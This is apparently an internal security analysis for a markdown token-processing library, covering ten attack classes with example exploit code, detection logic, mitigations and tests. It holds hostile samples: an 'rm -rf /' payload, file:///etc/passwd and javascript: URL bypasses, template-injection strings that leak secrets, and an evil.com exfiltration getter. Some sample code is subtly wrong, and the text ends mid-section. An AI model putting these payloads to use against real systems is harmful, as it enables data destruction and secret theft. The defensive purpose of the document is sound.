# Deep Vulnerabilities Analysis - Phase 8 Token Warehouse

**Version**: 1.0
**Date**: 2025-10-15
**Status**: Advanced security analysis - non-obvious attack vectors
**Audience**: Security architects, senior engineers, penetration testers

---

## Overview

This document covers **non-obvious, high-impact vulnerabilities** beyond basic XSS/SSRF:

- Supply-chain attacks (deserialization, prototype pollution)
- Normalization mismatches (URL encoding tricks)
- Chained trust vulnerabilities (template injection)
- Side-channel attacks (timing leaks, traffic amplification)
- Algorithmic complexity attacks (O(N²) DoS)
- Deep nesting attacks (stack overflow)
- Bitmask fragility (determinism failures)
- Heap fragmentation (GC thrash)
- Race conditions (TOCTOU in multithreaded servers)

**Why this matters**: These attacks are **stealthy**, **hard to detect**, and **bypass naive security measures**.

---

## Security Domain - Deep Failure Modes

### Vulnerability 1: Token Deserialization & Prototype Pollution (Supply-Chain)

**Severity**: 🔴 CRITICAL

**What happens**:
Tokens reconstructed from JSON, plugins, or 3rd-party token factories can embed fields that shadow internal keys (`__class__`, `__getattr__`) or unexpected attributes that the system later evals or trusts. This causes **remote code execution** or **silently changes behavior** (Python equivalent of prototype pollution).

**How triggered**:
```python
# Malicious token from untrusted source
malicious_token_json = {
    "type": "link_open",
    "map": {"__int__": "os.system('rm -rf /')"},  # Custom __int__ for RCE
    "href": "https://evil.com",
    "__class__": "malicious.RemoteExecutor"  # Prototype pollution
}

# Naive deserialization
import json
token = json.loads(malicious_token_json)

# Later in code:
line_num = int(token.map[0])  # Triggers custom __int__ → RCE
```

**Why worse than it looks**:
- Attackers can craft tokens that **appear normal** but cause downstream consumers to behave incorrectly
- **Stealthy supply-chain attack**: Compromised plugin or webhook provides poisoned tokens
- **Delayed execution**: Malicious code triggers during parsing, not during ingestion
- **Shadow keys**: Fields like `__getattribute__` can intercept all attribute access

**Real-world scenarios**:
1. **Webhook compromise**: External preprocessor sends poisoned tokens
2. **Plugin supply-chain**: NPM/PyPI package provides malicious token factory
3. **CI/CD injection**: Pull request with crafted test fixtures

**Detection**:
```python
# Audit incoming tokens for non-primitive fields
def validate_token_json(token_dict):
    """Check for suspicious fields."""
    suspicious_keys = {
        "__class__", "__getattr__", "__setattr__", "__getattribute__",
        "__dict__", "__weakref__", "__init__", "__new__", "__call__"
    }

    for key in token_dict.keys():
        if key in suspicious_keys:
            raise SecurityError(f"Suspicious field in token: {key}")

        # Check if map contains non-primitives
        if key == "map" and not all(isinstance(x, (int, type(None))) for x in token_dict[key]):
            raise SecurityError("Non-primitive map value")

# Monitoring
if any(hasattr(tok, key) for key in suspicious_keys for tok in tokens):
    alert("token_prototype_pollution_detected")
```

**Mitigation (immediate)**:
```python
# 1. Canonicalize to primitives IMMEDIATELY (already in TOKEN_VIEW_CANONICALIZATION.md)
def create_safe_token_view(tok):
    """Create primitive-only view, never trust token methods."""
    view = {}

    # Allowlist approach: only extract known safe attributes
    safe_attrs = {"type", "nesting", "tag", "info", "content"}

    for attr in safe_attrs:
        try:
            # Use getattr, NEVER call custom methods
            value = getattr(tok, attr, None)
            # Ensure primitive types only
            if isinstance(value, (str, int, type(None))):
                view[attr] = value
            else:
                view[attr] = str(value)  # Force to string
        except Exception:
            view[attr] = None

    # Handle map specially (must be tuple of ints)
    try:
        mp = getattr(tok, "map", None)
        if mp and isinstance(mp, (list, tuple)) and len(mp) == 2:
            view["map"] = (
                int(mp[0]) if isinstance(mp[0], int) else None,
                int(mp[1]) if isinstance(mp[1], int) else None
            )
        else:
            view["map"] = None
    except Exception:
        view["map"] = None

    return view

# 2. Reject deserialization of untrusted tokens
def load_tokens_safely(json_data):
    """Load tokens with validation."""
    tokens = []
    for item in json.loads(json_data):
        # Validate before creating token object
        validate_token_json(item)
        # Create simple token with only safe fields
        token = SimpleToken(item)
        tokens.append(token)
    return tokens

# 3. NEVER use pickle on untrusted data
# BAD: pickle.loads(untrusted_data)
# GOOD: json.loads(untrusted_data) + validation
```

**Test**:
```python
def test_prototype_pollution_blocked():
    """Verify poisoned tokens are rejected."""
    malicious = {
        "type": "link_open",
        "__class__": "evil.RemoteExec",
        "map": [0, 1]
    }

    with pytest.raises(SecurityError):
        validate_token_json(malicious)
```

---

### Vulnerability 2: URL Normalization Mismatch → Bypassed Allowlist

**Severity**: 🔴 CRITICAL

**What happens**:
Collector allowlists check `url.split(':',1)[0]` or naive string prefixes. Attackers use **Unicode tricks**, **percent-encoding**, **mixed case**, or **path normalization** so downstream fetchers interpret the URL differently — enabling `javascript:`, `file:`, or SSRF despite allowlist.

**How triggered**:
```python
# Attack vectors
attack_urls = [
    "jAvAsCrIpT:alert(1)",              # Mixed case (case-insensitive schemes)
    "java\u0000script:alert(1)",        # NULL byte injection
    "java%0ascript:alert(1)",           # Newline in scheme
    "//\\u0000file:///etc/passwd",      # Unicode escape + protocol-relative
    "http://example.com@evil.com",      # User info trick
    "http://[::1]/admin",                # IPv6 localhost
    "http://127.0.0.1:8080/",           # Localhost variation
    "ftp://example.com#@evil.com",      # Fragment trick
]

# Naive allowlist (BROKEN)
def naive_check(url):
    return url.split(":")[0].lower() in ["http", "https"]

# Passes check but resolves to javascript:
naive_check("jAvAsCrIpT:alert(1)")  # ✓ False (caught)
naive_check("java\u0000script:alert(1)")  # ✓ True (BYPASSED!)
```

**Why worse than it looks**:
- **Mismatch between validator and resolver**: Collector says "safe", fetcher says "unsafe" (or vice versa)
- **False sense of security**: Developers trust the allowlist flag
- **IDN punycode cloaking**: `xn--80ak6aa92e.com` looks benign but resolves to Cyrillic domain
- **URL parser inconsistencies**: Different libraries parse URLs differently

**Real-world scenarios**:
1. **SSRF via normalization**: URL passes collector check, fetcher resolves to internal IP
2. **XSS via encoding**: Escaped in collector, unescaped in renderer
3. **File disclosure**: `file:` scheme hidden via encoding

**Detection**:
```python
# Create corpus of tricky URLs
tricky_urls = [
    "javascript:alert(1)",
    "jAvAsCrIpT:alert(1)",
    "java\u0000script:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "//evil.com",
    "http://localhost/admin",
    "http://127.0.0.1/internal",
]

# Test both collector and fetcher
def test_normalization_consistency():
    """Verify collector and fetcher agree on safety."""
    for url in tricky_urls:
        collector_safe = collector_allows(url)
        fetcher_safe = fetcher_allows(url)

        assert collector_safe == fetcher_safe, \
            f"Mismatch: {url} (collector={collector_safe}, fetcher={fetcher_safe})"
```

**Mitigation (immediate)**:
```python
from urllib.parse import urlparse, urlunparse
import re

ALLOWED_SCHEMES = {"http", "https", "mailto", "tel"}
CONTROL_CHARS = re.compile(r'[\x00-\x1f\x7f]')

def normalize_url(url: str) -> str:
    """Centralized normalization (use EVERYWHERE)."""
    # 1. Strip whitespace
    url = url.strip()

    # 2. Reject control characters
    if CONTROL_CHARS.search(url):
        raise ValueError("URL contains control characters")

    # 3. Reject protocol-relative URLs
    if url.startswith('//'):
        raise ValueError("Protocol-relative URLs not allowed")

    # 4. Parse with urlparse (handles most tricks)
    try:
        parsed = urlparse(url)
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

    # 5. Normalize scheme (lowercase)
    scheme = parsed.scheme.lower() if parsed.scheme else None

    # 6. Check allowlist
    if scheme and scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Scheme not allowed: {scheme}")

    # 7. Reject if no scheme but starts with weird chars
    if not scheme and url.startswith(('javascript:', 'data:', 'file:')):
        raise ValueError("Suspicious schemeless URL")

    # 8. IDN punycode normalization (prevent homograph attacks)
    hostname = parsed.hostname
    if hostname:
        try:
            # Decode IDN to unicode, re-encode to punycode
            hostname_unicode = hostname.encode('ascii').decode('idna')
            hostname_punycode = hostname_unicode.encode('idna').decode('ascii')

            # Check for confusables (basic check)
            if any(ord(c) > 127 for c in hostname_unicode):
                # Log for review
                log_security_event("idn_hostname", hostname=hostname, unicode=hostname_unicode)
        except Exception:
            raise ValueError("Invalid hostname encoding")

    # 9. Reconstruct normalized URL
    normalized = urlunparse((
        scheme or '',
        parsed.netloc.lower() if parsed.netloc else '',
        parsed.path,
        parsed.params,
        parsed.query,
        parsed.fragment
    ))

    return normalized

def safe_url_check(url: str) -> bool:
    """Check if URL is safe (use in both collector and fetcher)."""
    try:
        normalized = normalize_url(url)
        parsed = urlparse(normalized)

        # Additional checks
        if parsed.scheme and parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # Block localhost/private IPs (if applicable)
        if parsed.hostname:
            if parsed.hostname in ('localhost', '127.0.0.1', '::1'):
                return False
            # Check private IP ranges (implement as needed)
            # if is_private_ip(parsed.hostname): return False

        return True
    except ValueError:
        return False
```

**Test**:
```python
def test_url_normalization_attacks():
    """Verify normalization blocks tricks."""
    attack_urls = [
        ("javascript:alert(1)", False),
        ("jAvAsCrIpT:alert(1)", False),
        ("java\u0000script:alert(1)", False),
        ("//evil.com", False),
        ("http://localhost", False),
        ("https://example.com", True),
    ]

    for url, expected_safe in attack_urls:
        assert safe_url_check(url) == expected_safe, \
            f"Failed on {url} (expected={expected_safe})"
```

---

### Vulnerability 3: Metadata Poisoning → Template Injection (SSTI)

**Severity**: 🟠 HIGH

**What happens**:
Collectors extract headings/links and later populate templates (search index, preview, TOC). If you allow arbitrary `{{ }}` or template syntax in headings without proper escaping, an attacker can get **server-side template code executed** or **break rendering logic**.

**How triggered**:
```python
# Malicious markdown
malicious_md = """
# {{ config.SECRET_KEY }}
## {% for key in config.keys() %}{{ key }}{% endfor %}
### {{''.__class__.__mro__[1].__subclasses__()}}
"""

# Naive rendering (VULNERABLE)
from jinja2 import Template
heading_text = extract_heading(malicious_md)  # "{{ config.SECRET_KEY }}"
template = Template(f"<h1>{heading_text}</h1>")
output = template.render(config=app.config)  # LEAKS SECRET_KEY!
```

**Why worse than it looks**:
- **Two-stage attack**: Requires both (1) unescaped rendering and (2) collector passing raw content
- **Escalation**: From XSS to **server-side RCE** via template engines
- **Secret leakage**: Can extract environment variables, config, database credentials
- **Supply-chain**: Compromised markdown in documentation repos

**Real-world scenarios**:
1. **Documentation site**: Pull request with malicious heading → CI builds docs → secrets leaked
2. **Search index**: Heading text indexed → search results render templates → RCE
3. **Preview generation**: Markdown preview service renders headings → SSTI

**Detection**:
```python
# Detect template syntax in user content
TEMPLATE_PATTERNS = [
    r'\{\{.*?\}\}',      # Jinja2, Django
    r'\{%.*?%\}',        # Jinja2, Django
    r'\$\{.*?\}',        # JSP, Freemarker
    r'<%.*?%>',          # JSP, ASP
    r'#set\(.*?\)',      # Velocity
]

def contains_template_syntax(text: str) -> bool:
    """Check if text contains template directives."""
    import re
    return any(re.search(pattern, text) for pattern in TEMPLATE_PATTERNS)

# In collector
heading_data = {
    "text": heading_text,
    "contains_template_syntax": contains_template_syntax(heading_text),
    "sanitized_text": escape_html(heading_text)  # Pre-escaped version
}
```

**Mitigation (immediate)**:
```python
from markupsafe import escape
from jinja2 import Environment, select_autoescape

# 1. Always escape before rendering
def safe_render_heading(heading_text):
    """Render heading with escaping."""
    # Escape HTML
    safe_text = escape(heading_text)
    return f"<h1>{safe_text}</h1>"

# 2. Use safe template engine config
env = Environment(
    autoescape=select_autoescape(['html', 'xml']),
    # Disable dangerous filters
    finalize=lambda x: x if x is not None else ''
)

# 3. Mark sensitive content at collection time
class HeadingsCollector:
    def finalize(self, wh):
        return {
            "headings": [
                {
                    "text": h["text"],
                    "safe": escape(h["text"]),  # Pre-escaped
                    "has_template_syntax": contains_template_syntax(h["text"])
                }
                for h in self._headings
            ]
        }

# 4. Renderer checks flag
def render_heading(heading):
    if heading.get("has_template_syntax"):
        # Use pre-escaped version or reject
        return f"<h1>{heading['safe']}</h1>"
    else:
        # Still escape (defense in depth)
        return f"<h1>{escape(heading['text'])}</h1>"
```

**Test**:
```python
def test_template_injection_blocked():
    """Verify SSTI vectors are escaped."""
    attacks = [
        "{{ config.SECRET_KEY }}",
        "{% for x in ''.__class__.__mro__[1].__subclasses__() %}{{ x }}{% endfor %}",
        "${env.SECRET}",
    ]

    for attack in attacks:
        heading = {"text": attack}
        rendered = render_heading(heading)

        # Verify template syntax not executed
        assert "{{" not in rendered or "&lt;" in rendered
        assert "{%" not in rendered or "&lt;" in rendered
```

---

### Vulnerability 4: Side-Channel Timing / Traffic Amplification

**Severity**: 🟡 MEDIUM (but high operational impact)

**What happens**:
Attackers craft many links that cause background previewers to fetch external resources. Even if collectors mark links as unsafe, a **naive previewer might still attempt resolution**, causing **outbound traffic amplification** or **timing leaks** (fingerprinting internal behavior).

**How triggered**:
```python
# Malicious markdown with 10,000 links
malicious_md = "\n".join([
    f"[link {i}](http://attacker.com/callback?id={i})"
    for i in range(10000)
])

# Naive previewer (VULNERABLE)
for link in extract_links(malicious_md):
    # Even if link["allowed"] == False, still fetches!
    try:
        response = requests.get(link["url"], timeout=5)
        preview_data = generate_preview(response.text)
    except Exception:
        pass
```

**Why worse than it looks**:
- **Privacy leak**: Reveals which internal IPs/hostnames are accessible
- **Fingerprinting**: Timing differences reveal internal network topology
- **Amplification**: 1 malicious document → 10,000 outbound requests
- **Rate limit bypass**: Distributed across many docs

**Real-world scenarios**:
1. **Internal network scanning**: Craft links to `http://10.0.0.1`, `http://10.0.0.2`, ... and observe timing
2. **Firewall probing**: Check which ports/protocols are open by observing timeouts
3. **DDoS amplification**: Abuse previewer as proxy for attacking external sites

**Detection**:
```python
# Network monitoring
def monitor_outbound_requests():
    """Track outbound request patterns."""
    metrics = {
        "requests_per_document": Counter(),
        "unique_hosts": set(),
        "suspicious_patterns": []
    }

    # Alert on anomalies
    if requests_per_document > 100:
        alert("traffic_amplification", doc_id=doc_id)

    if "10.0." in host or "192.168." in host:
        alert("internal_ip_probe", host=host)

    # Timing analysis
    response_times = []
    if stddev(response_times) > threshold:
        alert("timing_side_channel", doc_id=doc_id)
```

**Mitigation (immediate)**:
```python
# 1. Isolate all fetchers (no inline fetching)
class IsolatedFetcher:
    """Sandboxed fetcher with controls."""

    def __init__(self):
        self.rate_limiter = RateLimiter(max_requests=100, window=60)
        self.allowed_hosts = {"example.com", "trusted.org"}
        self.blocked_ips = {"127.0.0.1", "::1", "10.0.0.0/8", "192.168.0.0/16"}

    def fetch(self, url):
        # Rate limit per document/user
        if not self.rate_limiter.allow(document_id):
            raise RateLimitError("Too many requests")

        # Parse and validate
        parsed = urlparse(url)

        # Block private IPs
        if self.is_private_ip(parsed.hostname):
            raise SecurityError("Private IP not allowed")

        # Block non-allowlisted hosts (if strict mode)
        if STRICT_MODE and parsed.hostname not in self.allowed_hosts:
            raise SecurityError("Host not allowed")

        # Fetch with controls
        response = requests.get(
            url,
            timeout=5,
            max_redirects=3,
            allow_redirects=True,
            headers={"User-Agent": "Warehouse-Fetcher/1.0"}
        )

        # Size limit
        if len(response.content) > 1_000_000:  # 1MB
            raise ValueError("Response too large")

        return response

# 2. Never fetch inline during parsing
# BAD:
for link in links:
    preview = fetch_preview(link["url"])  # ❌

# GOOD:
async def background_preview_generation():
    """Separate service for preview generation."""
    for link in links:
        if link["allowed"]:  # Only fetch allowed links
            await isolated_fetcher.fetch(link["url"])
```

---

## Runtime Domain - Deep Failure Modes

### Vulnerability 5: Algorithmic Complexity Poisoning (O(N²) DoS)

**Severity**: 🟠 HIGH

**What happens**:
A collector maintains state and, for each token, **scans previously collected items** (e.g., link dedupe by naive list search, or nested list detection via repeated scanning). An adversary constructs input causing the inner loops to escalate, leading to **O(N²) or worse CPU**.

**How triggered**:
```python
# Naive collector (VULNERABLE)
class LinksCollector:
    def __init__(self):
        self._links = []

    def on_token(self, idx, token, ctx, wh):
        if token.type == "link_open":
            href = token.href

            # ❌ O(N) search per token → O(N²) total
            if not any(link["url"] == href for link in self._links):
                self._links.append({"url": href})

# Attack: 10,000 unique links
malicious_md = "\n".join([
    f"[link {i}](http://example.com/{i})" for i in range(10000)
])
# Result: 10,000 * 10,000 / 2 = 50M comparisons!
```

**Why worse than it looks**:
- **With 1M tokens** this becomes catastrophic (1T comparisons)
- **Unpredictable tail latency**: Small inputs fast, large inputs hang
- **Queue blowout**: Slow requests back up, exhaust workers

**Real-world scenarios**:
1. **Link dedupe**: Naive uniqueness check per link
2. **Nested list detection**: Scanning open stack for each token
3. **Section attribution**: Linear search for section_id per element

**Detection**:
```python
import time

def benchmark_complexity():
    """Test if parse time grows quadratically."""
    sizes = [100, 200, 500, 1000, 2000]
    times = []

    for size in sizes:
        tokens = generate_tokens(size)
        start = time.perf_counter()
        wh = TokenWarehouse(tokens, None)
        elapsed = time.perf_counter() - start
        times.append(elapsed)

    # Check if quadratic
    # Time should grow as O(N²): ratio of times should be ~4x for 2x input
    ratio = times[-1] / times[0]
    expected_linear = sizes[-1] / sizes[0]  # ~20x
    expected_quadratic = (sizes[-1] / sizes[0]) ** 2  # ~400x

    if ratio > expected_linear * 2:
        alert("algorithmic_complexity_issue", ratio=ratio)
```

**Mitigation (immediate)**:
```python
# 1. Use hash-based structures
class LinksCollector:
    def __init__(self):
        self._links = []
        self._seen_urls = set()  # ✅ O(1) lookup

    def on_token(self, idx, token, ctx, wh):
        if token.type == "link_open":
            href = token.href

            # ✅ O(1) membership check
            if href not in self._seen_urls:
                self._seen_urls.add(href)
                self._links.append({"url": href})

# 2. Use warehouse indices (already O(1))
# Instead of: for token in tokens: if token.type == "link"
# Use: for idx in wh.by_type.get("link_open", []): ...

# 3. Add guard rails
MAX_ITEMS_PER_TYPE = 10_000

def on_token(self, idx, token, ctx, wh):
    if len(self._links) >= MAX_ITEMS_PER_TYPE:
        self._truncated = True
        return  # Stop processing
    # ... rest of logic ...
```

---

### Vulnerability 6: Deep Nesting → Stack Overflow

**Severity**: 🟡 MEDIUM

**What happens**:
Extremely deep nested lists or blockquotes produce very deep `nesting` values or long open-stack lengths. If your parent/pairs logic or any consumer uses **recursion** or a stack of size proportional to nesting, you can **exceed Python recursion limits** or cause **very large stacks**.

**How triggered**:
```python
# Generate deeply nested lists (1000 levels)
malicious_md = ""
for i in range(1000):
    malicious_md += "  " * i + "- item\n"

# Naive recursive processing (VULNERABLE)
def process_list(node):
    if node.type == "list_item":
        for child in node.children:
            process_list(child)  # ❌ Recursion depth = nesting level
```

**Why worse than it looks**:
- **Python recursion limit**: Default 1000, can be hit with crafted input
- **Memory blowup**: Each recursion level allocates stack frame
- **Hard to recover**: RecursionError crashes process, no graceful degradation

**Real-world scenarios**:
1. **Generated docs**: Deeply nested bullet points in auto-generated content
2. **Blockquote chains**: Email-style `>>> >>> >>>` nesting
3. **Tree renderers**: Recursive HTML generation from AST

**Detection**:
```python
def test_deep_nesting():
    """Verify deep nesting handled gracefully."""
    max_depth = 2000
    tokens = generate_deep_nesting(max_depth)

    try:
        wh = TokenWarehouse(tokens, None)
        # Should either succeed or fail gracefully
    except RecursionError:
        pytest.fail("RecursionError on deep nesting")
```

**Mitigation (immediate)**:
```python
# 1. Enforce nesting limit
MAX_NESTING = 1000

def __init__(self, tokens, tree, text=None):
    # Check max nesting
    max_nesting = max((getattr(tok, 'nesting', 0) for tok in tokens), default=0)
    if max_nesting > MAX_NESTING:
        raise ValueError(f"Nesting too deep: {max_nesting} (max {MAX_NESTING})")

    # ... rest of init ...

# 2. Use iterative algorithms (no recursion)
def process_tree_iterative(root):
    """Process tree without recursion."""
    stack = [root]
    while stack:
        node = stack.pop()
        # Process node
        if hasattr(node, 'children'):
            stack.extend(reversed(node.children))

# 3. Compact parent maps (no per-level objects)
# Instead of: parent_stack = [obj1, obj2, obj3, ...]  # O(depth) memory
# Use: parent_map = {idx: parent_idx, ...}  # O(N) memory
```

---

### Vulnerability 7: Bitmask Fragility & Determinism Failures

**Severity**: 🟡 MEDIUM

**What happens**:
Using bitmasks for `ignore_inside` is fast but **fragile** when number of unique token types grows (plugins). If mapping is **non-deterministic** between runs or machines (e.g., mapping assignment order depends on dict iteration), collectors' masks can differ, leading to **different behavior across nodes**.

**How triggered**:
```python
# Non-deterministic mapping (Python <3.7, or dict iteration)
def build_type_to_bit_mapping(token_types):
    mapping = {}
    bit = 1
    for ttype in token_types:  # ❌ Order not guaranteed
        mapping[ttype] = bit
        bit <<= 1
    return mapping

# Different plugin load orders on different machines
# Machine A: {"fence": 1, "code": 2}
# Machine B: {"code": 1, "fence": 2}
# Result: Collectors skip different tokens!
```

**Why worse than it looks**:
- **Subtle, hard-to-test correctness bugs**: Only manifest under specific plugin sets
- **Non-reproducible**: Works in staging, fails in production (or vice versa)
- **Silent data loss**: Collectors skip tokens unexpectedly

**Real-world scenarios**:
1. **Multi-node deployment**: Each node has different plugin load order
2. **CI vs production**: Different Python versions, different dict iteration order
3. **Plugin updates**: Adding plugin changes all bit assignments

**Detection**:
```python
def test_deterministic_mapping():
    """Verify bit mapping is deterministic."""
    results = []

    for _ in range(10):
        # Reload plugins in random order
        reload_plugins(random.shuffle(plugins))
        wh = TokenWarehouse(tokens, None)
        result = wh.finalize_all()
        results.append(result)

    # All results should be identical
    for i in range(1, len(results)):
        assert results[0] == results[i], \
            f"Non-deterministic behavior on run {i}"
```

**Mitigation (immediate)**:
```python
# 1. Deterministic mapping (sorted)
def build_type_to_bit_mapping(token_types):
    mapping = {}
    bit = 1
    for ttype in sorted(token_types):  # ✅ Deterministic order
        mapping[ttype] = bit
        bit <<= 1
    return mapping

# 2. Fallback to set for large type counts
MAX_BITS = 64

def build_ignore_filter(token_types):
    if len(token_types) > MAX_BITS:
        # Use set (O(1) avg, no bit limit)
        return SetBasedFilter(token_types)
    else:
        # Use bitmask (fast for small sets)
        return BitmaskFilter(token_types)

# 3. Add startup consistency check
def validate_bit_mapping():
    """Ensure mapping is consistent with baseline."""
    current = build_type_to_bit_mapping(all_types)
    expected = load_baseline_mapping()

    if current != expected:
        raise RuntimeError("Bit mapping changed! This breaks determinism.")
```

---

### Vulnerability 8: Heap Fragmentation / GC Thrash

**Severity**: 🟡 MEDIUM

**What happens**:
Collectors build many temporary strings (small concatenations, repeated `+=` on strings, or many small list objects). On very large docs, this causes a huge number of **short-lived objects**, triggering **heavy GC work** and **long pauses**.

**How triggered**:
```python
# Naive string building (VULNERABLE)
class LinksCollector:
    def on_token(self, idx, token, ctx, wh):
        if token.type == "inline":
            # ❌ Creates new string object on each append
            self._current_text += token.content

# With 10,000 inline tokens → 10,000 string allocations → GC thrash
```

**Why worse than it looks**:
- **Even if CPU sufficient**, GC pauses produce **p95/p99 latency spikes**
- **Memory fragmentation** can escalate RSS (Resident Set Size)
- **Unpredictable**: Depends on Python GC tuning, heap state

**Real-world scenarios**:
1. **Text accumulation**: Building link text via `+=` in loop
2. **Many small dicts**: Per-token metadata dicts, most discarded
3. **Repeated list growth**: Append to list without preallocation

**Detection**:
```python
import gc
import tracemalloc

def profile_allocations():
    """Monitor allocation patterns."""
    tracemalloc.start()
    gc.collect()  # Baseline

    # Parse document
    wh = TokenWarehouse(tokens, None)
    wh.dispatch_all()

    current, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    # Check for excessive allocations
    snapshot = tracemalloc.take_snapshot()
    top_stats = snapshot.statistics('lineno')

    for stat in top_stats[:10]:
        if stat.count > 10000:  # Many small allocations
            alert("gc_thrash_risk", location=stat, count=stat.count)
```

**Mitigation (immediate)**:
```python
# 1. Use list.append() + "".join() for strings
class LinksCollector:
    def __init__(self):
        self._text_buffer = []  # ✅ List of strings

    def on_token(self, idx, token, ctx, wh):
        if token.type == "inline":
            # ✅ O(1) append
            self._text_buffer.append(token.content)

        elif token.type == "link_close":
            # ✅ O(N) join once
            final_text = "".join(self._text_buffer)
            self._links.append({"text": final_text})
            self._text_buffer = []

# 2. Preallocate lists when counts known
class HeadingsCollector:
    def __init__(self):
        # Estimate size from indices
        heading_count = len(wh.by_type.get("heading_open", []))
        self._headings = [None] * heading_count  # Preallocate
        self._idx = 0

# 3. Reuse buffers
class BufferPool:
    """Pool of reusable buffers."""
    def __init__(self):
        self._pool = []

    def acquire(self):
        return self._pool.pop() if self._pool else []

    def release(self, buffer):
        buffer.clear()
        self._pool.append(buffer)
```

---

### Vulnerability 9: TOCTOU / Race Conditions (Multithreaded Servers)

**Severity**: 🟡 MEDIUM (in threaded deployments)

**What happens**:
If collectors register or mutate shared routing or mask maps at runtime in a server that serves **many threads**, a race can **corrupt `_routing`** (e.g., list→tuple conversion interleaved), or **collectors may mutate shared state** during dispatch.

**How triggered**:
```python
# Thread 1: Registers collector during request
wh.register_collector(LinksCollector())

# Thread 2: Simultaneously calls dispatch_all()
wh.dispatch_all()  # ❌ Reads _routing while Thread 1 modifies it

# Race: _routing is partially updated → IndexError or wrong collectors called
```

**Why worse than it looks**:
- **Nondeterministic failures**: Works 99% of the time, fails rarely
- **Data corruption**: Collectors process wrong tokens
- **Hard to debug**: Heisenbug (disappears when debugging)

**Real-world scenarios**:
1. **Dynamic collector registration**: Plugin loads at runtime
2. **Shared warehouse instance**: Multiple requests use same warehouse
3. **Collector state mutation**: Collectors modify shared caches

**Detection**:
```python
import threading
import concurrent.futures

def test_concurrent_dispatch():
    """Verify thread safety under concurrency."""
    wh = TokenWarehouse(tokens, None)
    errors = []

    def dispatch_worker():
        try:
            wh.dispatch_all()
        except Exception as e:
            errors.append(e)

    # Run 100 concurrent dispatches
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(dispatch_worker) for _ in range(100)]
        concurrent.futures.wait(futures)

    assert len(errors) == 0, f"Concurrency errors: {errors}"
```

**Mitigation (immediate)**:
```python
# 1. Make registration startup-only
class TokenWarehouse:
    def __init__(self, tokens, tree, text=None):
        self._collectors = []
        self._registration_frozen = False

    def register_collector(self, col):
        if self._registration_frozen:
            raise RuntimeError("Cannot register after dispatch started")
        self._collectors.append(col)

    def dispatch_all(self):
        # Freeze registration on first dispatch
        if not self._registration_frozen:
            self._routing = self._build_routing()
            self._registration_frozen = True

        # ... dispatch logic ...

# 2. Make routing immutable
def _build_routing(self):
    """Build immutable routing table."""
    routing = defaultdict(list)
    for col in self._collectors:
        for ttype in col.interest.types:
            routing[ttype].append(col)

    # Freeze to tuples (immutable)
    return {k: tuple(v) for k, v in routing.items()}

# 3. Document: collectors MUST NOT mutate shared state
# Add to collector interface:
class Collector(Protocol):
    """Collector interface.

    THREAD SAFETY: on_token() must not mutate shared state.
    Use instance variables only (self._items, etc.)
    """
```

---

### Vulnerability 10: Blocking IO in Collectors / Token Accessors

**Severity**: 🟠 HIGH (operational impact)

**What happens**:
Collectors or token getters perform **blocking I/O operations** (HTTP requests, database queries, file reads) inside `on_token()` callbacks. Since dispatch is **single-pass and synchronous**, one slow I/O blocks the entire parse, tying up worker threads and causing **queue accumulation**.

**How triggered**:
```python
# VULNERABLE collector (blocks on HTTP)
class LinksCollector:
    def on_token(self, idx, token, ctx, wh):
        if token.type == "link_open":
            href = token.href

            # ❌ Synchronous HTTP call blocks dispatch
            try:
                response = requests.get(href, timeout=5)
                is_valid = response.status_code == 200
            except Exception:
                is_valid = False

            self._links.append({"url": href, "valid": is_valid})

# Or: poisoned token with blocking getter
class MaliciousToken:
    @property
    def href(self):
        # ❌ Blocks dispatch with network call
        return requests.get("http://evil.com/exfiltrate").text
```

**Why worse than it looks**:
- **Service unavailability**: One doc with blocking IO makes entire parsing service unresponsive
- **Thread pool exhaustion**: All worker threads blocked waiting for I/O
- **Cascading timeouts**: Upstream services timeout waiting for parse results
- **Amplification attack**: Attacker crafts doc with hundreds of links → hundreds of blocking calls

**Real-world scenarios**:
1. **URL validation**: Collector checks if links are reachable by fetching them
2. **Database lookups**: Collector queries DB to check if URL is blacklisted
3. **File operations**: Collector reads large files synchronously during parse
4. **External API calls**: Collector calls translation API for each heading

**Detection**:
```python
# Profiling shows time spent in I/O syscalls
import cProfile
import pstats

def profile_dispatch():
    """Profile dispatch to detect blocking I/O."""
    profiler = cProfile.Profile()
    profiler.enable()

    wh = TokenWarehouse(tokens, None)
    wh.dispatch_all()

    profiler.disable()
    stats = pstats.Stats(profiler)

    # Check for network/file I/O in hot path
    for func_name in ['socket.', 'requests.', 'urllib.', 'open', 'read']:
        if func_name in str(stats):
            alert("blocking_io_detected", function=func_name)

# Runtime metrics
import time

def monitor_dispatch_time():
    """Alert on unexpectedly long dispatch times."""
    start = time.perf_counter()
    wh.dispatch_all()
    elapsed = time.perf_counter() - start

    # Dispatch should be fast (< 10ms for typical doc)
    if elapsed > 0.1:  # 100ms threshold
        alert("slow_dispatch", duration_ms=elapsed * 1000)
```

**Mitigation (immediate)**:
```python
# 1. NEVER do blocking I/O in on_token()
class LinksCollector:
    """Collect links for later validation (no I/O during dispatch)."""

    def __init__(self):
        self._links = []

    def on_token(self, idx, token, ctx, wh):
        if token.type == "link_open":
            # ✅ Just collect - no I/O
            self._links.append({"url": token.href})

    def finalize(self, wh):
        return {"links": self._links, "validation": "deferred"}

# 2. Defer I/O to separate async worker
async def validate_links_async(links):
    """Validate links asynchronously after parsing."""
    async with aiohttp.ClientSession() as session:
        tasks = [validate_link(session, link["url"]) for link in links]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    return results

# 3. Use timeouts around any unavoidable I/O
from func_timeout import func_timeout, FunctionTimedOut

def safe_getter_with_timeout(token, attr, timeout=0.1):
    """Access token attribute with timeout."""
    try:
        # Wrap in timeout (100ms max)
        value = func_timeout(timeout, lambda: getattr(token, attr, None))
        return value
    except FunctionTimedOut:
        log_security_event("token_getter_timeout", attr=attr)
        return None  # Fallback

# 4. Document: collectors MUST be non-blocking
class Collector(Protocol):
    """Collector interface.

    PERFORMANCE CONTRACT:
    - on_token() MUST complete in < 1ms per token
    - on_token() MUST NOT perform blocking I/O
    - on_token() MUST NOT make network requests
    - on_token() MUST NOT access databases
    - on_token() MUST NOT read/write files

    Defer expensive operations to finalize() or post-processing.
    """
    def on_token(self, idx, token, ctx, wh) -> None: ...
```

**Test**:
```python
